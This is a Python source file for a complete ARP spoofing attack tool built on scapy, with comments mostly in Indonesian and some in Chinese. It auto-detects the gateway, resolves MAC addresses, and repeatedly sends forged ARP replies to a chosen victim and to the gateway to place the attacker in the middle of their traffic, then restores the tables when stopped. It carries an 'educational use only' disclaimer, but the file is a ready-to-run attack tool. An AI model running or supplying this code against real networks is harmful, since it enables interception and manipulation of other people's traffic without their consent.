#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import sys
import subprocess
import platform
import re
from scapy.layers.l2 import ARP, Ether


def detect_default_gateway():
    """
    读取本机默认 IPv4 网关（macOS / Linux）。失败返回 None。
    """
    try:
        if platform.system().lower() == "darwin":
            r = subprocess.run(
                ["route", "-n", "get", "default"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            for line in (r.stdout or "").splitlines():
                line = line.strip()
                if line.startswith("gateway:"):
                    gw = line.split(":", 1)[1].strip()
                    if gw and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", gw):
                        return gw
        else:
            # Linux: ip route
            r = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            m = re.search(r"\bdefault\s+via\s+(\d{1,3}(?:\.\d{1,3}){3})\b", r.stdout or "")
            if m:
                return m.group(1)
            # fallback: route -n
            r2 = subprocess.run(
                ["route", "-n"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            for line in (r2.stdout or "").splitlines():
                if line.startswith("0.0.0.0") or line.startswith("default"):
                    parts = line.split()
                    for p in parts:
                        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", p) and p != "0.0.0.0":
                            return p
    except Exception:
        pass
    return None


class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        """
        Inisialisasi ARP Spoofer
        
        Args:
            target_ip (str): IP address korban
            gateway_ip (str): IP address gateway
            interface (str): Interface jaringan (optional)
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.is_running = False
        self.original_target_mac = None
        self.original_gateway_mac = None
        
        # Dapatkan MAC address asli
        self._get_original_mac_addresses()
    
    def _get_original_mac_addresses(self):
        """
        Mendapatkan MAC address asli dari target dan gateway
        """
        print("[*] Mendapatkan MAC address asli...")
        
        # Dapatkan MAC address target
        self.original_target_mac = self._get_mac_address(self.target_ip)
        if not self.original_target_mac:
            print(f"[!] Tidak dapat menemukan MAC address untuk {self.target_ip}")
            sys.exit(1)
        
        # Dapatkan MAC address gateway
        self.original_gateway_mac = self._get_mac_address(self.gateway_ip)
        if not self.original_gateway_mac:
            print(f"[!] Tidak dapat menemukan MAC address untuk {self.gateway_ip}")
            sys.exit(1)
            
        print(f"[+] Target MAC: {self.original_target_mac}")
        print(f"[+] Gateway MAC: {self.original_gateway_mac}")
    
    def _get_mac_address(self, ip):
        """
        Mendapatkan MAC address dari IP address menggunakan ARP request
        
        Args:
            ip (str): IP address target
            
        Returns:
            str: MAC address atau None jika tidak ditemukan
        """
        try:
            # Buat ARP request packet
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Kirim packet dan tunggu response
            srp_kw = {"timeout": 2, "verbose": False}
            if self.interface:
                srp_kw["iface"] = self.interface
            answered_list = scapy.srp(arp_request_broadcast, **srp_kw)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
            
        except Exception as e:
            print(f"[!] Error mendapatkan MAC address: {e}")
            return None
    
    def _create_arp_response(self, target_ip, gateway_ip):
        """
        Membuat ARP response palsu
        
        Args:
            target_ip (str): IP address yang akan menerima response
            gateway_ip (str): IP address yang akan di-spoof
            
        Returns:
            ARP: Paket ARP response palsu
        """
        # Buat ARP response dengan MAC address penyerang
        return ARP(op=2, pdst=target_ip, hwdst=self.original_target_mac, 
                  psrc=gateway_ip)
    
    def _send_arp_response(self, target_ip, gateway_ip):
        """
        Mengirim ARP response palsu
        
        Args:
            target_ip (str): IP address target
            gateway_ip (str): IP address gateway
        """
        try:
            # Buat dan kirim ARP response palsu
            packet = self._create_arp_response(target_ip, gateway_ip)
            scapy.send(packet, verbose=False, iface=self.interface)
            
        except Exception as e:
            print(f"[!] Error mengirim ARP response: {e}")
    
    def start_attack(self, interval=2):
        """
        Memulai serangan ARP spoofing
        
        Args:
            interval (int): Interval pengiriman packet dalam detik
        """
        self.is_running = True
        print(f"\n[*] Memulai ARP spoofing attack...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        print(f"[*] Interval: {interval} detik")
        print("[*] Tekan Ctrl+C untuk menghentikan attack\n")
        
        packet_count = 0
        
        try:
            while self.is_running:
                # Kirim ARP response palsu ke target (buat target berpikir kita adalah gateway)
                self._send_arp_response(self.target_ip, self.gateway_ip)
                
                # Kirim ARP response palsu ke gateway (buat gateway berpikir kita adalah target)
                self._send_arp_response(self.gateway_ip, self.target_ip)
                
                packet_count += 2
                print(f"[+] Paket terkirim: {packet_count}", end='\r')
                
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print("\n[*] Attack dihentikan oleh user")
            self.stop_attack()
        except Exception as e:
            print(f"\n[!] Error saat attack: {e}")
            self.stop_attack()
    
    def stop_attack(self):
        """
        Menghentikan serangan dan mengembalikan ARP table normal
        """
        self.is_running = False
        print("\n[*] Menghentikan attack...")
        self.restore_arp_table()
    
    def restore_arp_table(self):
        """
        Mengembalikan ARP table ke kondisi semula
        """
        print("[*] Mengembalikan ARP table ke kondisi semula...")
        
        try:
            # Kirim ARP response yang benar ke target
            restore_target = ARP(op=2, pdst=self.target_ip, 
                               hwdst=self.original_target_mac,
                               psrc=self.gateway_ip, 
                               hwsrc=self.original_gateway_mac)
            
            # Kirim ARP response yang benar ke gateway
            restore_gateway = ARP(op=2, pdst=self.gateway_ip, 
                                hwdst=self.original_gateway_mac,
                                psrc=self.target_ip, 
                                hwsrc=self.original_target_mac)
            
            # Kirim beberapa kali untuk memastikan
            for _ in range(5):
                scapy.send(restore_target, verbose=False, iface=self.interface)
                scapy.send(restore_gateway, verbose=False, iface=self.interface)
                time.sleep(0.5)
            
            print("[+] ARP table berhasil dikembalikan")
            
        except Exception as e:
            print(f"[!] Error saat mengembalikan ARP table: {e}")

def main():
    """
    Fungsi utama program
    """
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Tool")
    parser.add_argument("-t", "--target", required=True,
                       help="IP address target")
    parser.add_argument("-g", "--gateway", default=None,
                       help="Gateway IPv4（省略时尝试从本机默认路由自动检测，macOS/Linux）")
    parser.add_argument("-i", "--interface", 
                       help="Network interface (optional)")
    parser.add_argument("--interval", type=int, default=2, 
                       help="Interval pengiriman packet (default: 2 detik)")
    
    args = parser.parse_args()

    if not args.gateway:
        args.gateway = detect_default_gateway()
        if args.gateway:
            print(f"[*] 未指定 -g，使用检测到的默认网关: {args.gateway}")
        else:
            print("[!] 必须提供网关: arp_attack.py -t <目标> -g <网关IP>")
            print("    例: -g 192.168.1.1  （或确保 route/ip 能解析 default gateway）")
            sys.exit(2)

    if not args.target:
        print("[!] 必须提供目标 -t")
        sys.exit(1)
    
    print("=" * 50)
    print("    ARP SPOOFING ATTACK TOOL")
    print("    Untuk keperluan edukasi")
    print("=" * 50)
    
    # Peringatan
    print("\n[!] PERINGATAN:")
    print("    Tool ini hanya untuk keperluan edukasi dan penelitian")
    print("    Penggunaan tanpa izin dapat melanggar hukum")
    print("    Pastikan Anda memiliki izin untuk melakukan testing")
    
    confirm = input("\nApakah Anda yakin ingin melanjutkan? (y/N): ")
    if confirm.lower() != 'y':
        print("Program dihentikan.")
        sys.exit(0)
    
    try:
        # Inisialisasi spoofer
        spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
        
        # Mulai attack
        spoofer.start_attack(args.interval)
        
    except KeyboardInterrupt:
        print("\n[*] Program dihentikan")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        print("\n[*] Program selesai")

if __name__ == "__main__":
    main()